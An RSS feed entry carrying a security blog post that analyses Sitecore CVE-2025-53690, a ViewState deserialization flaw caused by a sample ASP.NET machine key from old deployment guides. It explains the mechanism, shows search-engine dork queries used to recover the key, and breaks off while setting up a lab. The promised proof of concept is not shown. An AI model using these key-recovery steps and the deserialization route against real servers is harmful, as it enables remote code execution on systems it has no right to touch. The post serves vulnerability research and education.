<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>CVE-Analysis on Erik Learning Sec</title><link>https://demo.stack.jimmycai.com/categories/cve-analysis/</link><description>Recent content in CVE-Analysis on Erik Learning Sec</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Thu, 30 Oct 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://demo.stack.jimmycai.com/categories/cve-analysis/index.xml" rel="self" type="application/rss+xml"/><item><title>Sitecore CVE-2025-53690 Detailed Analysis &amp; Weaponized POC - Why you shouldnâ€™t blindly trust the documentation</title><link>https://demo.stack.jimmycai.com/p/cve-2025-53690/</link><pubDate>Thu, 30 Oct 2025 00:00:00 +0000</pubDate><guid>https://demo.stack.jimmycai.com/p/cve-2025-53690/</guid><description>&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/cover.jpg" alt="Featured image of post Sitecore CVE-2025-53690 Detailed Analysis &amp; Weaponized POC - Why you shouldnâ€™t blindly trust the documentation" /&gt;&lt;h2 id="brief-introduction-to-sitecore"&gt;Brief Introduction to Sitecore
&lt;/h2&gt;&lt;p&gt;Sitecore is a Digital Experience Platform and a commerce-ready content management system designed for enterprise use. The solution combines content management, e-commerce, and marketing automation, allowing organizations to deliver personalized experiences across websites, mobile apps, and other channels. Typical Sitecore customers are medium to large businesses in industries such as retail, finance, healthcare, travel, education, and the public sector â€” organizations that require multiple sites, high availability, and deep integrations with internal systems. Because Sitecore often serves at the center of customer journeys and transactional processes, security vulnerabilities can have serious impacts on business operations and data privacy.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image1.png"
width="1818"
height="872"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image1_hu_7b19956bf8dfcefa.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image1_hu_55f12399578693af.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="208"
data-flex-basis="500px"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id="a-little-backstory-d"&gt;A little Backstory :D
&lt;/h2&gt;&lt;p&gt;One fine day while scrolling Twitter for news and technical updates I ran into an alert about a critical Sitecore CVE with a CVSS score of 9.0. Naturally curious, I dove into analyzing this critical case :D&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image2.png"
width="1030"
height="702"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image2_hu_9eb453d5296262de.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image2_hu_1bda0dc6287986c1.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="146"
data-flex-basis="352px"
&gt;&lt;/p&gt;
&lt;p&gt;This tweet references a Google/Mandiant blog that analyzed a recent campaign exploiting Sitecore instances using a sample machine key present in Sitecore&amp;rsquo;s official deployment guides dating back to &lt;strong&gt;2017 and earlier&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image3.png"
width="2256"
height="1098"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image3_hu_409331ab6eb77a9c.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image3_hu_c29aaaec55a37225.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="205"
data-flex-basis="493px"
&gt;&lt;/p&gt;
&lt;p&gt;That analysis points to the root cause: leaked ASP.NET machine keys which allow an attacker to control the ViewState deserialization mechanism in ASP.NET applications and achieve RCE. First, we need to understand how this mechanism works.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id="some-concepts-about-viewstate"&gt;Some concepts about VIEWSTATE
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;VIEWSTATE&lt;/strong&gt; is an ASP.NET mechanism used to persist the state of server controls across postbacks in a web application. Because HTTP is &lt;strong&gt;stateless&lt;/strong&gt;, VIEWSTATE stores control state (e.g., TextBox values, CheckBox states, etc.) by serializing it to a binary blob, encoding it in Base64, and embedding it into the hidden &lt;code&gt;__VIEWSTATE&lt;/code&gt; field in the HTML. This mechanism relies on the &lt;strong&gt;Machine Key&lt;/strong&gt; for data protection and validation to ensure VIEWSTATE integrity and confidentiality.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image4.png"
width="768"
height="518"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image4_hu_aca0dc49df664540.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image4_hu_998f60ceab48f8f3.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="148"
data-flex-basis="355px"
&gt;&lt;/p&gt;
&lt;h3 id="why-viewstate-exists"&gt;Why VIEWSTATE exists
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;State persistence&lt;/strong&gt;: VIEWSTATE preserves the state of UI controls across postbacks.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Support for event-driven programming model&lt;/strong&gt;: ASP.NET&amp;rsquo;s event model expects controls to remember their previous state to handle events (e.g., button clicks).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Server-side load reduction&lt;/strong&gt;: By storing state on the client rather than server-side session storage, VIEWSTATE reduces server memory usage (suitable for apps that don&amp;rsquo;t require complex server-side state).&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="the-role-of-machine-key-in-viewstate"&gt;The role of Machine Key in VIEWSTATE
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Machine Key&lt;/strong&gt; is a pair of secret keys (validationKey and decryptionKey) configured in &lt;code&gt;web.config&lt;/code&gt; or the server to protect VIEWSTATE:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Validation (MAC)&lt;/strong&gt;: Ensure VIEWSTATE hasn&amp;rsquo;t been tampered with by generating a Message Authentication Code (MAC).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Encryption&lt;/strong&gt;: Optionally protect VIEWSTATE content from being read in plaintext.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="serialization-and-deserialization-process-for-viewstate"&gt;Serialization and deserialization process for VIEWSTATE
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;Serialization&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;The server collects control state (TextBox values, DropDownList selection, etc.).&lt;/li&gt;
&lt;li&gt;The data is &lt;strong&gt;serialized&lt;/strong&gt; into binary, optionally encrypted with the decryptionKey, and a MAC is created using the validationKey.&lt;/li&gt;
&lt;li&gt;The resulting Base64 string is embedded into the hidden &lt;code&gt;__VIEWSTATE&lt;/code&gt; input.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Deserialization&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;The client posts back the page including &lt;code&gt;__VIEWSTATE&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The server verifies the MAC using the validationKey.&lt;/li&gt;
&lt;li&gt;If valid, the server decrypts (if encrypted) using the decryptionKey and deserializes to restore control state.&lt;/li&gt;
&lt;li&gt;This state is then used to handle events and render updates.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-powershell" data-lang="powershell"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Browser&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;Server&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ASP&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;NET&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="mf"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Send&lt;/span&gt; &lt;span class="n"&gt;HTTP&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="p"&gt;/&lt;/span&gt;&lt;span class="n"&gt;POST&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|--------------------------------------&amp;gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="mf"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt; &lt;span class="n"&gt;handles&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;builds&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Collect&lt;/span&gt; &lt;span class="n"&gt;control&lt;/span&gt; &lt;span class="n"&gt;states&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Serialize&lt;/span&gt; &lt;span class="n"&gt;states&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;blob&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Encrypt&lt;/span&gt; &lt;span class="n"&gt;blob&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;Machine&lt;/span&gt; &lt;span class="n"&gt;Key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;decryption&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Create&lt;/span&gt; &lt;span class="n"&gt;MAC&lt;/span&gt; &lt;span class="n"&gt;using&lt;/span&gt; &lt;span class="n"&gt;Machine&lt;/span&gt; &lt;span class="n"&gt;Key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;validation&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Embed&lt;/span&gt; &lt;span class="n"&gt;blob&lt;/span&gt; &lt;span class="n"&gt;into&lt;/span&gt; &lt;span class="n"&gt;__VIEWSTATE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&amp;lt;--------------------------------------|&lt;/span&gt; &lt;span class="mf"&gt;3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="k"&gt;Return&lt;/span&gt; &lt;span class="n"&gt;HTML&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;__VIEWSTATE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="mf"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;User&lt;/span&gt; &lt;span class="n"&gt;interacts&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;postback&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Sends&lt;/span&gt; &lt;span class="n"&gt;__VIEWSTATE&lt;/span&gt; &lt;span class="n"&gt;back&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|--------------------------------------&amp;gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="mf"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt; &lt;span class="n"&gt;receives&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Verify&lt;/span&gt; &lt;span class="n"&gt;MAC&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;validation&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Decrypt&lt;/span&gt; &lt;span class="n"&gt;__VIEWSTATE&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;decryption&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Deserialize&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;restore&lt;/span&gt; &lt;span class="n"&gt;control&lt;/span&gt; &lt;span class="n"&gt;state&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="p"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Handle&lt;/span&gt; &lt;span class="n"&gt;events&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;update&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;|&amp;lt;--------------------------------------|&lt;/span&gt; &lt;span class="mf"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt; &lt;span class="n"&gt;Send&lt;/span&gt; &lt;span class="n"&gt;updated&lt;/span&gt; &lt;span class="n"&gt;HTML&lt;/span&gt; &lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;__VIEWSTATE&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;From this mechanism we can infer that once an attacker obtains the machine key, they can craft a VIEWSTATE that forces the server to deserialize arbitrary objects. The attacker can then exploit deserialization gadget chains to run arbitrary code on the server.&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id="how-can-an-attacker-obtain-the-machine-key-common-cases"&gt;How can an attacker obtain the machine key? Common cases:
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The webapp has a file-disclosure vulnerability (File Inclusion, Path Traversal, &lt;a class="link" href="https://medium.com/@0xUN7H1NK4BLE/how-ssrf-leads-to-rce-in-a-net-application-ee1b13812245" target="_blank" rel="noopener"
&gt;SSRF&lt;/a&gt;, etc.), allowing reading &lt;code&gt;web.config&lt;/code&gt; from the webroot.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;The attacker used another vulnerability to obtain RCE and then extracted the machine key to persist access. This technique has been observed in recent APT campaigns exploiting CVE-2025-49704 and CVE-2025-49706 (SharePoint ToolShell).&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image5.png"
width="939"
height="632"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image5_hu_ce0468f446030ffe.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image5_hu_d9e95bd5fa28f7f1.png 1024w"
loading="lazy"
alt="Source: https://www.trellix.com/blogs/research/critical-sharepoint-vulnerabilities-under-active-exploitation/"
class="gallery-image"
data-flex-grow="148"
data-flex-basis="356px"
&gt;&lt;/p&gt;
&lt;p&gt;This technique was discussed in detail by researcher &lt;a class="link" href="https://soroush.me/" target="_blank" rel="noopener"
&gt;&lt;strong&gt;Soroush Dalili&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://soroush.me/blog/danger-of-stealing-auto-generated-net-machine-keys" target="_blank" rel="noopener"
&gt;https://soroush.me/blog/danger-of-stealing-auto-generated-net-machine-keys&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Using machine keys leaked on the internet and cracking ViewState with public wordlists: &lt;a class="link" href="https://github.com/NotSoSecure/Blacklist3r" target="_blank" rel="noopener"
&gt;https://github.com/NotSoSecure/Blacklist3r&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id="analyzing-the-cve"&gt;Analyzing the CVE
&lt;/h2&gt;&lt;p&gt;For CVE-2025-53690, the attacker did not use the above typical methods; instead, they leveraged a Machine Key that was &lt;strong&gt;shared in old Sitecore deployment guides&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image6.png"
width="885"
height="419"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image6_hu_41e1c2461e276715.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image6_hu_275269da105cf374.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="211"
data-flex-basis="506px"
&gt;&lt;/p&gt;
&lt;p&gt;In Mandiant&amp;rsquo;s analysis they didn&amp;rsquo;t point out the machineKey being used in the campaign, but the blog does link to Sitecore&amp;rsquo;s Security Bulletin here: &lt;a class="link" href="https://support.sitecore.com/kb?id=kb_article_view&amp;amp;sysparm_article=KB1003865" target="_blank" rel="noopener"
&gt;https://support.sitecore.com/kb?id=kb_article_view&amp;sysparm_article=KB1003865&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In the Solution section, Sitecore provides some guidance to help customers mitigate the issue, but inadvertently gives us a hint: the machine key starts with &lt;code&gt;BDDFE367CDâ€¦&lt;/code&gt; and the validation key starts with &lt;code&gt;0DAC68D020â€¦&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image7.png"
width="922"
height="537"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image7_hu_d3efd97e6215a78b.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image7_hu_6de1c6172972cf6c.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="171"
data-flex-basis="412px"
&gt;&lt;/p&gt;
&lt;p&gt;From there we can start searching using Google dorking.&lt;/p&gt;
&lt;p&gt;First, try searching &lt;code&gt;BDDFE367CD site:sitecore.com&lt;/code&gt; to limit results to the sitecore domain.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image8.png"
width="1211"
height="305"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image8_hu_4d90f3a5a805b9a5.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image8_hu_db19e7d3f105930.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="397"
data-flex-basis="952px"
&gt;&lt;/p&gt;
&lt;p&gt;That search returned only the security bulletin we already referenced.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image9.png"
width="1118"
height="329"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image9_hu_8dd1a6b8a0d82d14.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image9_hu_52041523dbc42a8a.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="339"
data-flex-basis="815px"
&gt;&lt;/p&gt;
&lt;p&gt;Similarly, &lt;code&gt;0DAC68D020 site:sitecore.com&lt;/code&gt; returned no additional results.&lt;/p&gt;
&lt;p&gt;Using our knowledge that the MachineKey is usually configured in &lt;code&gt;web.config&lt;/code&gt;, which looks like:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image10.png"
width="706"
height="210"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image10_hu_2330516b5f1d7089.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image10_hu_d093e3bdf214c575.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="336"
data-flex-basis="806px"
&gt;&lt;/p&gt;
&lt;p&gt;We changed the dork to:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="s2"&gt;&amp;#34;&amp;lt;machineKey&amp;#34;&lt;/span&gt; site:sitecore.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This produced more hits and after scrolling we found the document referenced in the security bulletin.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image11.png"
width="1321"
height="675"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image11_hu_5044d294bc2c1f27.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image11_hu_73234d5d9fa8de4d.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="195"
data-flex-basis="469px"
&gt;&lt;/p&gt;
&lt;p&gt;We can see the machineKey and validation key here match the hints from the security bulletin (machine key starting with &lt;code&gt;BDDFE367CDâ€¦&lt;/code&gt; and validation key starting with &lt;code&gt;0DAC68D020â€¦&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image12.png"
width="652"
height="132"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image12_hu_4161672b3ad3f831.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image12_hu_9856f429f8fdee2e.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="493"
data-flex-basis="1185px"
&gt;&lt;/p&gt;
&lt;p&gt;If this is only a sample key, why did it become a serious CVE scoring CVSS 9.0?&lt;/p&gt;
&lt;p&gt;Reading the guidance carefully, the language here is problematic:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image13.png"
width="678"
height="298"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image13_hu_7049f174469aeb1e.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image13_hu_ba5b6529ea631b90.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="227"
data-flex-basis="546px"
&gt;&lt;/p&gt;
&lt;p&gt;The document says:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ðŸ˜…
You can either paste this key into your web.config file or generate another unique key at:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="http://www.orcsweb.com/articles/aspnetmachinekey.aspx" target="_blank" rel="noopener"
&gt;http://www.orcsweb.com/articles/aspnetmachinekey.aspx&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;The first clause explicitly suggests that developers could take this sample key and paste it directly into their &lt;code&gt;web.config&lt;/code&gt; without generating a new unique key. It&amp;rsquo;s easy to guess that quite a few developers followed that suggestion, which led to the vulnerability.&lt;/p&gt;
&lt;p&gt;Evidence shows that searching this machineKey on Google finds many sources referring to its use. Worse, it appears the key has been included in public wordlists on GitHub for years.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image14.png"
width="1058"
height="937"
srcset="https://demo.stack.jimmycai.com/p/cve-2025-53690/image14_hu_98563f340f882cca.png 480w, https://demo.stack.jimmycai.com/p/cve-2025-53690/image14_hu_7987f489d24f0a14.png 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="112"
data-flex-basis="270px"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id="setting-up-a-sitecore-instance"&gt;Setting up a Sitecore instance
&lt;/h2&gt;&lt;p&gt;After obtaining the machineKey, we set up a lab to reproduce the POC.&lt;/p&gt;
&lt;p&gt;First, create a Sitecore Docker environment. Refer to: &lt;a class="link" href="https://www.youtube.com/watch?v=a-hjq7WcZiY" target="_blank" rel="noopener"
&gt;https://www.youtube.com/watch?v=a-hjq7WcZiY&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;After installing Docker Desktop, right-click the Docker icon in the tray and choose &amp;ldquo;Switch to Windows containersâ€¦&amp;rdquo;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://demo.stack.jimmycai.com/p/cve-2025-53690/image15.png"
width="529"
